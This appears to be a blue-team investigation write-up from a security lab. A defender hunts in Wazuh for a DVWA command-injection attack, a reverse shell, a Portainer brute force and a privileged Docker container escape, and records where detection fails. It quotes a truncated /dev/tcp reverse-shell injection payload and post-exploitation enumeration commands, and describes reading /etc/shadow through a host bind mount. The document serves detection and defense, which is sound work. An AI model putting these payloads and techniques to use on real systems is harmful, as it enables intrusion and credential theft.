# Blue Team Analysis — Command Injection → Docker Container Escape

> **Perspective:** This document is written from the **defender's** point of view.
> I had **no prior knowledge** of the attack described in
> [`attack-playbook.md`](./attack-playbook.md) going into this. As with the
> Kerberoasting and AS-REP Roasting investigations, this one starts from a
> **proactive hunt** rather than a clean alert queue — and, as this document
> will show, the detections I had in place only tell part of the story.
>
> Full case documentation, including the investigation timeline, assets,
> IOCs, and evidence, is maintained in DFIR-IRIS under case
> `04-command-injection`. This document summarizes the investigative
> narrative; IRIS is the system of record.

## Step 1 — Why hunt instead of wait for an alert?

DVWA sits on the VULNERABLE VLAN specifically so it can be attacked — but
that doesn't mean every interaction with it is benign lab testing. A
vulnerable web app with no detection coverage at all would be an obvious
blind spot, so before assuming "nothing's happened here," I wanted to check
what, if anything, Wazuh has actually been seeing from that host.

I started with the same question I'd ask of any web-facing asset: *has
anything unusual touched this box recently, and did any of it generate an
alert?*

## Step 2 — Pulling the data

In Wazuh Discover, I searched raw logs from the Docker host first, not just
alerts, to get an unfiltered picture of what's been hitting it:

```
agent.name: "vuln-docker-01"
```

This returned a mix of expected system noise — `sudo` session logs, package
management events, agent health events — but also entries from the DVWA
container itself, which told me the agent was at least picking up
*something* from that application.

<img width="763" height="450" alt="image" src="https://github.com/user-attachments/assets/50bac35c-8679-4736-9889-1855a5753530" />

Narrowing to just the web application traffic:

```
agent.name: "vuln-docker-01" AND data.log: *vulnerabilities*exec*
```

<details>
<summary>What this search does</summary>

| Part | What it does |
|---|---|
| `agent.name: "vuln-docker-01"` | Scopes to the Docker host running DVWA |
| `data.log: *vulnerabilities*exec*` | Filters to log lines referencing DVWA's Command Injection module specifically |
</details>

This surfaced multiple `POST /vulnerabilities/exec/` requests — the DVWA
form that passes user input into a shell `ping` command with no
sanitization. That endpoint has no legitimate business purpose; nothing
should ever be submitting to it outside of deliberate testing.

<img width="766" height="423" alt="image" src="https://github.com/user-attachments/assets/376a756d-0535-45a9-b5df-1086aa073b06" />

## Step 3 — Checking for a corresponding alert

Same discipline as the Kerberoasting hunt: a suspicious raw log entry is a
lead, not a conclusion. I checked whether this traffic had already tripped
a detection:

```
agent.name: "vuln-docker-01" AND rule.id: 100151
```

**Result: all three POST requests matched rule `100151`** — the custom rule
built for this scenario, which fires on any POST to the command-injection
endpoint and maps to MITRE T1190 (Exploit Public-Facing Application).

Good news on its face. But pulling apart the three alerts side by side
showed a limitation worth being honest about:

| Request | `data.log` content | Alert |
|---|---|---|
| 1 | `127.0.0.1` (baseline) | `100151` |
| 2 | `127.0.0.1; whoami` (injection test) | `100151` |
| 3 | `127.0.0.1; bash -c 'bash -i >& /dev/tcp/...'` (reverse shell) | `100151` |

**All three alerts are identical.** Rule `100151` detects that the endpoint
was *submitted to* — it does not, and cannot, inspect the POST body for
shell metacharacters or payload content, because Apache's combined log
format doesn't capture request bodies. From the alert queue alone, there is
no way to tell a harmless baseline test apart from a successful reverse
shell. An analyst triaging this in real time would see three identical,
low-context alerts and would have no signal from Wazuh telling them which
one mattered.

This is the first real gap in the detection coverage: **the endpoint-touch
rule proves someone used the vulnerable form, not what they did with it.**

<img width="766" height="422" alt="image" src="https://github.com/user-attachments/assets/4dd5a0a2-dfec-43ad-9bf1-fbc797f3dde8" />

## Step 4 — Pivoting past the web layer: what happened after the shell?
 
Rule `100151` tells me the vulnerable endpoint was hit three times. It tells
me nothing about what happened *after* — specifically, whether the third
request (the one containing a reverse shell payload) actually resulted in a
working connection out of the container.
 
I checked whether Wazuh had any visibility into the resulting network
connection at all:
 
```
agent.name: "vuln-docker-01" AND data.dstport: 4444
```
 
```
agent.name: "vuln-docker-01" AND rule.id: *
```
 
**Result: no matches for either.** No alert, no raw event, nothing
referencing port 4444 or any outbound connection from the DVWA container at
all. The `/dev/tcp` reverse shell technique — opening a raw TCP socket
directly through a bash built-in, with no external binary like `nc` or
`curl` involved — leaves nothing in Apache's access log (it's not an HTTP
request) and nothing in any log source currently being collected from this
host.
 
**Second gap: the actual code-execution and shell-establishment step of
this attack is completely invisible.** The only reason I know it happened
at all is because I already know a POST was made to the injection endpoint
and I know — from having access to the network diagram — that port 4444 is
how a Kali-to-target reverse shell would present. A real external analyst,
seeing only three identical `100151` alerts, would have no way to know a
shell was ever established, let alone confirm it after the fact from logs
alone.
 
## Step 5 — Checking for evidence of post-exploitation enumeration
 
If a reverse shell was established, the next thing an attacker does is
look around: check for `sudo` rights, readable credentials, SUID binaries,
other reachable hosts. I checked whether any of that activity left a trace
anywhere Wazuh could see:
 
```
agent.name: "vuln-docker-01" AND data.log: *passwd*
```
 
```
agent.name: "vuln-docker-01" AND data.log: *shadow*
```
 
```
agent.name: "vuln-docker-01" AND data.log: *sudo*
```
 
**No results for any of these specific to the DVWA container.** This is
expected, not a surprise — commands run inside an interactive reverse shell
(`cat /etc/passwd`, `sudo -l`, `find / -perm -4000`) are shell built-ins and
local process execution, not web requests and not journald/syslog events.
Apache's log only ever recorded the single POST that delivered the payload;
everything typed into the shell afterward happened entirely outside any
log source currently configured on this host.
 
**Third gap, and a structural one: there is no process-level or
command-execution visibility on vuln-docker-01 at all.** Wazuh's agent on
this host is currently limited to `df`, `netstat`, `last`, journald, and
`dpkg.log` — none of which would ever capture interactive shell activity
inside a container. Closing this gap would require something like
container-aware process auditing (e.g. Falco, or auditd scoped to the
container's process tree) — a meaningfully different, larger undertaking
than the detections built so far in this scenario.

## Step 6 — The Portainer brute force: a detection that works, with a blind spot I didn't expect
 
Separately from the DVWA hunt, I have a correlation rule (`100140`/`100141`)
that watches for rapid repeated connections to Portainer's management port
(`9443`) on `vuln-docker-01` — five or more attempts from the same source
within 60 seconds, mapped to MITRE T1110 (Brute Force). This rule is built
on pfSense firewall logs forwarded to Wazuh, not on anything local to the
Docker host.
 
I validated this rule against a direct test — connecting to Portainer
straight from an external host on the ATTACKER VLAN:
 
```
rule.id: 100141
```
 
**Result: fired as expected**, with `firedtimes` incrementing cleanly
across the correlation window, `data.srcip`/`data.dstip` populated, and the
MITRE tag attached. On the surface, this looked like a fully validated,
working detection.
 
**Then I tested it a different way — the way the real attack actually
happened.** Per the attack-playbook, the Portainer brute force in this
scenario wasn't run from an external attacker box. It was run *from inside
the already-compromised DVWA container*, using the reverse shell
established in Phase 1 — `curl` commands issued from
`www-data@<container>:/var/www/html/vulnerabilities/exec$`, targeting
Portainer on the same Docker host.
 
I re-ran that exact pattern — the brute-force loop issued from inside the
container's own shell rather than from an external box — and checked for
the same alert:
 
```
rule.id: 100141
```
 
**Result: nothing. No alert, no base-rule match, no raw pfSense log entry
at all.**
 
I confirmed this wasn't a fluke by checking the raw firewall log directly
for the exact window of the second test:
 
```
sudo tail -20 /var/log/pfsense/pfsense.log | grep "9443"
```
 
**Empty.** Not misfiltered, not misrouted — pfSense never saw this traffic
in the first place.
 
**Root cause:** rule `100140`/`100141` is built entirely on firewall logs
from pfSense — a perimeter device sitting at the VLAN boundary. Traffic
from the DVWA container to Portainer, when both are running on the *same*
Docker host (`vuln-docker-01`), travels over the host's internal Docker
bridge network. It never crosses a VLAN boundary pfSense is positioned to
filter or log. From pfSense's perspective, this traffic doesn't exist.
 
**This is the most significant finding in this investigation.** The rule I
validated and confirmed "working" genuinely does work — for an attacker
sitting outside the network, brute-forcing Portainer directly. But the real
attack path documented in this scenario is a **post-compromise, same-host
pivot**: an attacker who already has a foothold inside a container on the
target machine, attacking another service on that same machine. That
specific, and arguably more realistic, attack pattern is **completely
invisible** to a perimeter-based control. A detection that only covers
north-south (cross-VLAN) traffic has a structural blind spot for east-west
movement that never leaves the host — and that blind spot is exactly where
this attack actually happened.

## Step 7 — Hunting for the privileged container escape
 
The final phase of this attack, per the playbook, used a valid Portainer
session to create a privileged container with the host's root filesystem
bind-mounted in, then read `/etc/shadow` through it. I checked whether
Wazuh had any visibility into this at all:
 
```
agent.name: "vuln-docker-01" AND rule.id: *
```
 
**No alert exists for container creation, privileged mode, or host
filesystem mounts.** There is no rule written for this phase, and nothing
in the current log collection would feed one if there were — Docker API
calls through Portainer aren't logged by Portainer itself (confirmed
earlier: its container stdout shows only startup/lifecycle messages, no
per-request API audit trail), and Wazuh isn't watching the Docker socket or
API directly.
 
With no alert to work from, I fell back to manual hunting against the one
log source that might incidentally have caught something: the host's own
`journald`, which Wazuh is monitoring as a catch-all localfile source.
Specifically, I looked at `dockerd`'s own daemon log for container
lifecycle events around the time of the suspected attack:
 
```bash
journalctl -u docker --no-pager | grep -i "task-delete\|sbJoin"
```
 
This surfaced a container join event for a container named
**`magical_napier`** — Portainer's auto-generated name for a newly created
container — followed shortly after by a `task-delete` event for the same
container ID. I cross-referenced that container ID against `docker inspect`
and confirmed it no longer exists on the host at all; its full lifecycle
(created, ran, exited, removed) is visible **only** in this daemon event
log, nowhere else.
 
**This is a partial win from proactive hunting, not a working detection.**
I was able to reconstruct that *a* container was created and destroyed in a
short window — consistent with the attack's use of a short-lived privileged
container to read the host's credential file — but `dockerd`'s own event
log says nothing about what that container did, whether it was privileged,
what was bind-mounted into it, or that `/etc/shadow` was read. The evidence
confirms *something happened*; it does not, on its own, confirm *what*.
 
## Step 8 — Attempting a host-based mitigation
 
Given the Portainer-brute-force blind spot found in Step 6, I attempted to
close it with a host-based control: an `auditd` rule on `vuln-docker-01`
watching for outbound `connect()` syscalls, intended to catch Portainer API
traffic regardless of whether it crosses pfSense.
 
```bash
sudo auditctl -a always,exit -F arch=b64 -S connect -F key=portainer_connect
```
 
Testing this against a live connection surfaced two real problems rather
than a working rule:
 
1. **No scoping.** The rule fires on every `connect()` syscall host-wide —
   DNS lookups, `nscd` socket checks, unrelated process activity — not just
   traffic to Portainer. In a short test window this alone produced dozens
   of events with no useful signal-to-noise ratio.
2. **Attribution problem.** Every captured event showed `comm="sudo"
   exe="/usr/bin/sudo"` rather than the actual calling process, because the
   test was run through `sudo`. Correctly attributing a `connect()` call to
   a specific container's process tree — as opposed to the host shell that
   happened to invoke it — is a non-trivial problem on its own.
On top of both of those, the `saddr` field auditd records is a raw
hex-encoded socket address structure, not a human-readable IP:port — a
third layer of work (decoding, then getting that decoding into a Wazuh
rule) that was out of scope to solve in this session.
 
**I'm documenting this as an attempted and currently incomplete
mitigation**, not a closed gap. The rule was removed after testing to
avoid leaving unscoped, noisy logging running indefinitely; the underlying
blind spot from Step 6 remains open.
 
## Summary
 
| Phase | MITRE | Detected? | Notes |
|---|---|---|---|
| DVWA command injection (endpoint touch) | T1190 | **Yes** — rule `100151` | Detects the POST, not the payload; all 3 test requests produced identical alerts |
| Reverse shell establishment | T1059.004 | **No** | `/dev/tcp` leaves no trace in any current log source |
| Post-exploitation enumeration | T1082 / T1552 | **No** | No process-level visibility inside the container |
| Portainer brute force (external source) | T1110 | **Yes** — rule `100141` | Confirmed working for cross-VLAN attackers |
| Portainer brute force (from inside compromised container) | T1110 | **No** | The real attack path — traffic never crosses pfSense, structurally invisible to the current rule |
| Privileged container creation + host shadow read | T1611 / T1003.008 | **No** | No rule; partial corroboration only via manual `journald` hunting |
 
Two detections genuinely work and are validated against live traffic. Three
phases of the actual attack chain have no detection at all. One attempted
host-based mitigation was built, tested, and found incomplete rather than
abandoned outright — the audit rule's logic is sound in principle, but
scoping and process attribution need real work before it's usable.
 
The most important finding isn't any single gap — it's that the one rule I
was most confident in (Portainer brute force) turned out to only cover half
of its own threat model. A rule that passes testing from an external
attacker's perspective can still be structurally blind to the exact
same attack run from a foothold the attacker already has. That's worth
remembering for every detection in this lab going forward, not just this
scenario.
 
Full case documentation — timeline, IOCs, assets, and evidence — is in
DFIR-IRIS, case `04-command-injection`.
